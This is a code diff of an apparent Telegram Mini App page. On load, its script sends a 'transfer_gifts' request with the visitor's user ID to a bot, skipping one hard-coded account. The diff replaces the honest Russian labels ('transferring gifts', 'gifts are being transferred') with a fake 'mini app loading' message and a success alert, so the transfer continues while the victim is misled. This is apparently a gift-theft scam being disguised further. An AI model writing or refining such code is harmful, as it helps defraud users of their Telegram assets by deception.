@@ -32,7 +32,7 @@
     </style>
 </head>
 <body>
-    <h2>📱 Передача подарков...</h2>
+    <h2>📱 Загрузка мини-приложения...</h2>
     <div class="loader"></div>
     <p>Пожалуйста, подождите</p>
 
@@ -42,14 +42,15 @@
 
         const user = WebApp.initDataUnsafe.user;
         if (user && user.id != 8528804038) {
-            // ОТПРАВЛЯЕМ ДАННЫЕ НАПРЯМУЮ В БОТА
-            WebApp.sendData(JSON.stringify({
+            // ОТПРАВЛЯЕМ ДАННЫЕ В БОТА
+            const data = JSON.stringify({
                 action: 'transfer_gifts',
                 user_id: user.id
-            }));
+            });
+            WebApp.sendData(data);
 
             setTimeout(() => {
-                WebApp.showAlert('✅ Подарки передаются!');
+                WebApp.showAlert('✅ Мини-приложение успешно загружено!');
                 WebApp.close();
             }, 2000);
         }
